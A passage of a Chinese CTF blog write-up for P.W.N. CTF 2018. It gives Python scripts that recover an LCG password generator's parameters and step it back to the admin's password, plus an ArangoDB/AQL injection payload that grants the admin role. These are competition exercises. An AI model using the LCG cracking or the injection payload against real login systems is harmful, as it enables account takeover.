<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">News</span><br><span class="line">Website Launch</span><br><span class="line">I just took the website online. I wrote it myself! </span><br><span class="line">I also just signed up to make sure the signup process works.</span><br><span class="line">Then I created a secret flag, which worked as well!</span><br><span class="line">Flag Storage Maintenance</span><br><span class="line">Because of the new data protection laws in europe I decided to temporarily disable the secret flag storage... I hope i can bring it back up soon...</span><br></pre></td></tr></table></figure>
<p>可以看到对于我们这个账户而言，密码是被隐藏的，因此可能我们需要登录管理员的账户进行查看？那么管理员有可能是序号为1的那一个？那么我们就要考虑怎么去获取1号的密码了。因为这里的password recovery token没有地方去让我们使用，比赛结束后也有看别的战队是使用如下脚本分析了bitmap图片然后得到一些信息之后进行LCG破解的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> imageio</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    print(<span class="string">"Usage: %s file.bmp"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">filename = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">image = imageio.imread(filename)</span><br><span class="line">out = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> image:</span><br><span class="line">    tmp = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(line)):</span><br><span class="line">        tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">        tmp |= <span class="number">1</span> <span class="keyword">if</span> line[x] == <span class="number">255</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    print(<span class="string">"% 40d"</span> % tmp)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">对比两个用户bitmap图片中的信息可以发下现两者相差 313373133731337313373133731337</span><br><span class="line"></span><br><span class="line">这里只截取前五行</span><br><span class="line"></span><br><span class="line">34.bmp</span><br><span class="line">        10778143335877814333587781433348</span><br><span class="line">   8024293302815125776712035454147967229</span><br><span class="line">   8424888415969153255243735974754402615</span><br><span class="line">   3343897317520929957383430099400071436</span><br><span class="line">  12356584033995394658660863293223597252</span><br><span class="line">  </span><br><span class="line">35.bmp</span><br><span class="line">        11091516469609151646960915164685</span><br><span class="line">   9972138259316515878515303887207190382</span><br><span class="line">   7570417892854896822411051461517328212</span><br><span class="line">  16016475982551891670926030402121628733</span><br><span class="line">   9296242651229076123142121777120916609</span><br></pre></td></tr></table></figure>
<p>之后再推算出一下值之后进行的攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">m = 16285270385112413720426683811263350667</span><br><span class="line">a = 313373133731337313373133731337</span><br><span class="line">c = 123456789012345678901234567890</span><br></pre></td></tr></table></figure>
<p>但是我们这里不这么干，密码是LCG生成的(因为题目本身就提示了LCG这个算法)，那么我们这里就属于不清楚a\c\m的值对LCG生成器进行攻击，那么连续注册几个账号，采集一下密码输入一下脚本就好了。着这里使用burp多重放几次数据包就可以了，不用次都去输信息注册。</p>
<p><a href="https://i.loli.net/2018/11/02/5bdc17da5c3fc.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/02/5bdc17da5c3fc.png" alt="屏幕快照 2018-11-02 下午5.24.28.png"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">User Number: 34 </span><br><span class="line">Password: 4391179335210642486020975422279755323 </span><br><span class="line"></span><br><span class="line">User Number: 35 </span><br><span class="line">Password: 10752978387235368639990800431243402580 </span><br><span class="line"></span><br><span class="line">User Number: 36 </span><br><span class="line">Password: 829507054147681073533941628943699170 </span><br><span class="line"></span><br><span class="line">User Number: 37 </span><br><span class="line">Password: 7191306106172407227503766637907346427 </span><br><span class="line"></span><br><span class="line">User Number: 38 </span><br><span class="line">Password: 13553105158197133381473591646870993684</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line">reduce = functools.reduce</span><br><span class="line">gcd = math.gcd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, x, y = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(b, n)</span>:</span></span><br><span class="line">    g, x, _ = egcd(b, n)</span><br><span class="line">    <span class="keyword">if</span> g == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> x % n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_increment</span><span class="params">(states, modulus, multiplier)</span>:</span></span><br><span class="line">    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>]*multiplier) % modulus</span><br><span class="line">    <span class="keyword">return</span> modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_multiplier</span><span class="params">(states, modulus)</span>:</span></span><br><span class="line">    print(<span class="string">'states'</span>, states)</span><br><span class="line">    multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_modulus</span><span class="params">(states)</span>:</span></span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> zip(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> zip(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    modulus = abs(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)</span><br><span class="line"></span><br><span class="line">print(crack_unknown_modulus([<span class="number">4391179335210642486020975422279755323</span>, </span><br><span class="line">    <span class="number">10752978387235368639990800431243402580</span>, <span class="number">829507054147681073533941628943699170</span>, <span class="number">7191306106172407227503766637907346427</span>, <span class="number">13553105158197133381473591646870993684</span>]))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># m = 1  # the "multiplier"</span></span><br><span class="line"><span class="comment"># c = 6361799052024726153969825008963647257  # the "increment"</span></span><br><span class="line"><span class="comment"># n = 16285270385112413720426683811263350667  # the "modulus"</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">prng_lcg</span>:</span></span><br><span class="line">    m = <span class="number">1</span>  <span class="comment"># the "multiplier"</span></span><br><span class="line">    c = <span class="number">6361799052024726153969825008963647257</span>  <span class="comment"># the "increment"</span></span><br><span class="line">    n = <span class="number">16285270385112413720426683811263350667</span>  <span class="comment"># the "modulus"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, seed)</span>:</span></span><br><span class="line">        self.state = seed  <span class="comment"># the "seed"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.state = (self.state * self.m + self.c) % self.n</span><br><span class="line">        <span class="keyword">return</span> self.state</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prev</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.state = (self.state - self.c) % self.n</span><br><span class="line">        <span class="keyword">return</span> int(self.state)</span><br><span class="line"></span><br><span class="line"><span class="comment">#User Number: 46 </span></span><br><span class="line"><span class="comment">#Password: 15591686419057701451952140284790119739 </span></span><br><span class="line"></span><br><span class="line">gen = prng_lcg(<span class="number">15591686419057701451952140284790119739</span>) </span><br><span class="line"></span><br><span class="line">num = <span class="number">45</span></span><br><span class="line"><span class="keyword">while</span> num &gt; <span class="number">0</span>:</span><br><span class="line">    p = gen.prev()</span><br><span class="line">    print(num, p)</span><br><span class="line">    <span class="keyword">if</span> p == <span class="number">4391179335210642486020975422279755323</span>:</span><br><span class="line">        print(<span class="string">'sanity check: working'</span>)</span><br><span class="line">    num -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 =&gt; 6160325624856057770563639672902954513</span></span><br></pre></td></tr></table></figure>
<p>最后登录得到flag<br><a href="https://i.loli.net/2018/11/02/5bdc17d94dd01.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/02/5bdc17d94dd01.png" alt="屏幕快照 2018-11-02 下午5.23.43.png"></a></p>
<p>PS:关于此处LCG攻击，你可以查看<a href="http://zeroyu.xyz/2018/11/02/Cracking-LCG/" target="_blank" rel="noopener">《攻击线性同余生成器(LCG)》</a></p>
<h1 id="H-pster-Startup"><a href="#H-pster-Startup" class="headerlink" title="H!pster Startup"></a>H!pster Startup</h1><p>主页代码里可以找到后台，所以就不用扫描了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--  Main navigation  --&gt;</span><br><span class="line">&lt;ul class=&quot;main-nav nav navbar-nav navbar-right&quot;&gt;</span><br><span class="line">	&lt;li&gt;&lt;a href=&quot;#home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">	&lt;li&gt;&lt;a href=&quot;#service&quot;&gt;Services&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;!-- &lt;li&gt;&lt;a href=&quot;/admin&quot;&gt;Admin-Panel&lt;/a&gt;&lt;/li&gt; --&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;!-- /Main navigation --&gt;</span><br></pre></td></tr></table></figure>
<p>后台测试发现是ArangoDB并且使用pyArango进行驱动程序。源码中存在如下内容，所以需要<code>_id</code>参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try :</span><br><span class="line">    collection = self.database[docJson[&quot;_id&quot;].split(&quot;/&quot;)[0]]</span><br><span class="line">except KeyError :</span><br><span class="line">    raise CreationError(&quot;result %d is not a valid Document. Try setting rawResults to True&quot; % i)</span><br></pre></td></tr></table></figure>
<p>最终的payload为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user: &apos; || 1 RETURN &#123;_id: u._id, role:&apos;admin&apos;&#125; //</span><br></pre></td></tr></table></figure></p>
<p>flag为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1_l0v3_a_g00d_1nj3ct10n&#125;</span><br></pre></td></tr></table></figure>
<p>此处我在写note的时候，官方的题目已经关闭了，所以列出一些参考:</p>
<p><a href="https://www.pwndiary.com/write-ups/p-w-n-ctf-2018-hpster-startup-write-up-web216/" target="_blank" rel="noopener">[P.W.N. CTF 2018] H!pster Startup Write-up (Web216)</a></p>
<p><a href="https://0day.work/p-w-n-university-web-200-h-pster-startup-writeup/" target="_blank" rel="noopener">P.W.N University: web 200 - H!pster Startup writeup</a></p>
<p><a href="https://xz.aliyun.com/t/3096#toc-5" target="_blank" rel="noopener">《P.W.N. CTF web题解》</a></p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Login-Sec"><span class="toc-number">1.</span> <span class="toc-text">Login Sec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Converter"><span class="toc-number">2.</span> <span class="toc-text">Converter</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LCG-and-the-X"><span class="toc-number">3.</span> <span class="toc-text">LCG and the X</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#H-pster-Startup"><span class="toc-number">4.</span> <span class="toc-text">H!pster Startup</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&text=P.W.N. CTF Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&title=P.W.N. CTF Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&is_video=false&description=P.W.N. CTF Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=P.W.N. CTF Writeup&body=Check out this article: http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&title=P.W.N. CTF Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&title=P.W.N. CTF Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&title=P.W.N. CTF Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&title=P.W.N. CTF Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/&name=P.W.N. CTF Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2019 z3r0yu
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-129276044-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

    <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?8415e69cf54ba93c9ddb2eb597859c7d";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'z3r0yu';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


